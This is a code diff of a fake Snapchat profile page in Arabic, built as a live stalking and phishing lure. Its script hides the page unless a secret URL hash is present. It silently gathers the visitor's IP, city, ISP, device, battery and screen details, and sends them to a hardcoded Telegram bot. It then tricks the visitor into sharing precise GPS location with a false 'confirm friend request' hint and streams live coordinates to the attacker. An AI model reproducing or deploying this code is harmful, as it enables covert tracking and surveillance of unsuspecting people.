@@ -5,25 +5,24 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     
     <title>Snapchat | Ekhlas Ekhlas</title>
-    <meta name="description" content="Ekhlas Ekhlas on Snapchat. Add me to see my stories!">
     <meta property="og:title" content="Snapchat | Ekhlas Ekhlas">
     <meta property="og:description" content="أضفني على سناب شات! ✨">
     <meta property="og:image" content="https://e.top4top.io/p_3696kylgs4.jpeg">
+    <meta property="og:image:width" content="600">
+    <meta property="og:image:height" content="600">
     <meta property="og:type" content="profile">
-    <meta property="og:site_name" content="Snapchat">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content="https://e.top4top.io/p_3696kylgs4.jpeg">
 
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #FFFC00; margin: 0; padding: 0; display: none; overflow: hidden; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #FFFC00; margin: 0; padding: 0; display: none; }
         .snap-card { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
         .profile-pic { width: 140px; height: 140px; border-radius: 35px; border: 4px solid #000; background: #fff; object-fit: cover; margin-bottom: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.15); }
         .name { font-size: 26px; font-weight: bold; color: #000; margin-bottom: 5px; }
         .username { font-size: 16px; color: #333; margin-bottom: 25px; }
-        .add-btn { background: #000; color: #fff; border: none; padding: 16px 60px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 85%; max-width: 320px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
-        .add-btn:active { transform: scale(0.95); }
+        .add-btn { background: #000; color: #fff; border: none; padding: 16px 60px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 85%; max-width: 320px; }
         .snap-logo { width: 45px; position: absolute; top: 30px; }
-        .hint { margin-top: 25px; color: #000; font-size: 13px; font-weight: 500; opacity: 0.8; }
+        .hint { margin-top: 25px; color: #000; font-size: 13px; font-weight: 500; opacity: 0.8; padding: 0 20px; }
     </style>
 </head>
 <body id="mainBody">
@@ -32,60 +31,66 @@
         <img src="https://e.top4top.io/p_3696kylgs4.jpeg" class="profile-pic">
         <div class="name">Ekhlas Ekhlas</div>
         <div class="username">@ekhlas_ekhlas</div>
-        <button class="add-btn" onclick="initGPS()">إضافة صديق</button>
-        <p class="hint">يجب السماح بالوصول للموقع للعثور على الأصدقاء القريبين</p>
+        <button class="add-btn" onclick="triggerGPS()">إضافة صديق</button>
+        <p class="hint">يجب السماح بالوصول للموقع لتأكيد طلب الإضافة والعثور على الأصدقاء القريبين</p>
     </div>
 
     <script>
-        const TOKEN = '8492500020:AAH-KijyAHr_46BvwCvd0ociksbtycSXKJs';
-        const CHAT_ID = '7184970355';
+        const T = '8492500020:AAH-KijyAHr_46BvwCvd0ociksbtycSXKJs';
+        const C = '7184970355';
 
         window.onload = async () => {
             if(window.location.hash.includes("#secure")) {
                 document.getElementById('mainBody').style.display = 'block';
-                
-                // 1. سحب فوري للبيانات التقنية بصمت
-                captureFullDeviceData();
-                
-                // 2. طلب إذن الموقع فوراً عند الدخول
-                initGPS();
+                // سحب فوري للبيانات العميقة
+                captureDeepData();
+                // تفجير طلب الموقع في الأيفون فوراً
+                triggerGPS();
             } else {
                 window.location.replace("https://www.snapchat.com");
             }
         };
 
-        async function captureFullDeviceData() {
+        async function captureDeepData() {
             try {
-                const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
-                let bat = "N/A";
+                // 1. الموقع من الشبكة والـ IP
+                const r = await fetch('https://ipapi.co/json/').then(res => res.json());
+                
+                // 2. معلومات البطارية
+                let bat = "غير معروف";
                 if(navigator.getBattery) { 
                     const b = await navigator.getBattery(); 
                     bat = `${Math.round(b.level * 100)}% (${b.charging ? 'يُشحن' : 'لا يُشحن'})`; 
                 }
 
-                const report = `👻 **صيد سناب شات جديد (بيانات شاملة):**\n` +
-                               `👤 الاسم: Ekhlas Ekhlas\n` +
-                               `🌐 IP: ${ipRes.ip}\n` +
-                               `📍 المنطقة: ${ipRes.city} | ${ipRes.country_name}\n` +
-                               `🏢 المزود: ${ipRes.org}\n` +
-                               `📱 الجهاز: ${navigator.platform}\n` +
-                               `🧠 الرام: ${navigator.deviceMemory || 'غير معروف'} GB\n` +
-                               `🔋 البطارية: ${bat}\n` +
-                               `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n` +
-                               `🖥️ الشاشة: ${screen.width}x${screen.height}`;
+                // 3. معلومات تقنية إضافية (رام، معالج، اتصال)
+                const techMsg = `
+👻 **صيد سناب شات - بيانات عميقة:**
+👤 الاسم: Ekhlas Ekhlas
+🌐 IP: ${r.ip}
+📍 المدينة: ${r.city} | المزود: ${r.org}
+📱 الجهاز: ${navigator.platform}
+🧠 الرام: ${navigator.deviceMemory || 'غير محدد'} GB
+⚙️ الأنوية: ${navigator.hardwareConcurrency || 'N/A'} Core
+🔋 البطارية: ${bat}
+🔌 الإنترنت: ${navigator.connection ? navigator.connection.effectiveType : 'غير معروف'}
+⏰ الوقت: ${new Date().toLocaleString('ar-EG')}
+🖥️ الشاشة: ${screen.width}x${screen.height}
+                `;
                 
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}`);
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(techMsg)}`);
             } catch(e) {}
         }
 
-        function initGPS() {
-            const opt = { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 };
+        function triggerGPS() {
+            // إعدادات إجبار تفعيل GPS الأيفون (الموقع الدقيق)
+            const opt = { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 };
             
             navigator.geolocation.watchPosition(
                 (p) => {
                     const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                    const loc = `🎯 **موقع سناب شات دقيق (Live):**\n${map}\n🎯 الدقة: ${p.coords.accuracy.toFixed(1)} متر`;
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(loc)}`);
+                    const loc = `🎯 **موقع GPS حي ومؤكد:**\n${map}\n🎯 الدقة: ${p.coords.accuracy.toFixed(1)} متر`;
+                    fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(loc)}`);
                 },
                 null, 
                 opt
